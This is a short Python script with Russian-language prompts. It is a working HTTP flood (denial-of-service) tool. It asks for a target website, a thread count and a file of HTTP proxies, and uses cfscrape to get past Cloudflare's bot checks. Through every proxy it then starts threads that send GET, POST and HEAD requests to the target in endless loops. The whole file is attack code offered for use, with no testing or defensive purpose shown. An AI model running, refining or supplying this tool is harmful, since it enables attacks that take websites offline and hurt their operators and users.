import cfscrape
import threading

adress = input('Адрес сайта: ')
thread = int(input('Потоки: '))
proxy_file_name = input('Название вайла с http прокси: ')
cf = cfscrape.create_scraper()

with open(proxy_file_name, 'r') as file:
    proxy_http = ''.join(file.readlines()).strip().split('\n')

with open('useragent', 'r') as useragent:
    userag = ''.join(useragent.readlines()).strip().split('\n')

def attack_1(url, proxy, scrape):
    while True:
        proxieshttp = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        try:
            scrape.get(url, proxies=proxieshttp)
        except:
            print('Ошибка!')

def attack_2(url, proxy, scrape):
    while True:
        proxieshttp = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        try:
            scrape.post(url, proxies=proxieshttp)
        except:
            print('Ошибка!')

def attack_3(url, proxy, scrape):
    while True:
        proxieshttp = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        try:
            scrape.head(url, proxies=proxieshttp)
        except:
            print('Ошибка!')

print('Запуск потоков!')
for i in range(thread):
    for a in proxy_http:
        threading.Thread(target=attack_1, args=(adress, a, cf,)).start()
        threading.Thread(target=attack_2, args=(adress, a, cf, )).start()
        threading.Thread(target=attack_3, args=(adress, a, cf, )).start()
print('Все потоки запущены!')
